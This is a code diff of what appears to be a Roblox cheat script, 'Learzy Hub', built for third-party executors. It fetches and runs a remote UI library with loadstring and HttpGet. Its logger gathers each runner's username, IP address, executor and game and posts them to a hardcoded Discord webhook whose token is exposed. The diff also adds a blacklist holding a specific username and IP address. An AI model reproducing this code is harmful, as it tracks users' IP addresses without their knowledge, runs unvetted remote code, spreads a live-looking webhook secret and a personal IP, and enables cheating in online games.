@@ -5,16 +5,13 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local LocalPlayer = Players.LocalPlayer
 local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)
 
--- === Get Game Name for UI Title ===
-local success, productInfo = pcall(function()
-    return MarketplaceService:GetProductInfo(game.PlaceId)
-end)
-local gameName = success and productInfo and productInfo.Name or "Unknown Game"
+-- === Get Executor Name for UI Title ===
+local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"
 
 -- === Load Rayfield ===
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
-    Name = "Learzy Hub | " .. gameName,
+    Name = "Learzy Hub | " .. executorName,
     Icon = 0,
     LoadingTitle = "Learzy Hub",
     LoadingSubtitle = "by Learzy",
@@ -45,15 +42,15 @@ local Window = Rayfield:CreateWindow({
     }
 })
 
--- === Blacklist Setup ===
+-- === Webhook & Blacklist Setup ===
 local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
 
 local BlacklistedUsernames = {
-    [""] = true
+    ["InfxmousLearzy"] = true
 }
 
 local BlacklistedIPs = {
-    [""] = true
+    ["182.3.39.56"] = true
 }
 
 -- === Blacklist Screen ===
@@ -91,7 +88,7 @@ end
 -- === Client Info ===
 local function getClientInfo()
     local ip = "Unknown"
-    local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
+    local executor = executorName
     if requestFunction then
         local success, response = pcall(function()
             return requestFunction({
@@ -112,7 +109,17 @@ end
 -- === Webhook Logger ===
 local function sendWebhook(ip, executor, isBlacklisted)
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
-    local gameId = productInfo and productInfo.AssetId or tostring(game.PlaceId)
+    local gameName = "Unknown Game"
+    local gameId = tostring(game.PlaceId)
+
+    local success, info = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    if success and info then
+        gameName = info.Name or gameName
+        gameId = info.AssetId or gameId
+    end
+
     local blacklistStatus = isBlacklisted and "Yes" or "No"
 
     local payload = {
@@ -180,7 +187,7 @@ task.spawn(function()
     local tabCombat = Window:CreateTab("Combat", 4483362458)
     local tabVehicle = Window:CreateTab("Vehicle", 4483362458)
 
-    -- === Placeholder ===
+    -- === Placeholder Content ===
     tabPlayer:CreateParagraph({Title = "Player", Content = "Fitur player akan ditambahkan..."})
     tabVisual:CreateParagraph({Title = "Visual", Content = "Fitur visual akan ditambahkan..."})
     tabCombat:CreateParagraph({Title = "Combat", Content = "Fitur combat akan ditambahkan..."})
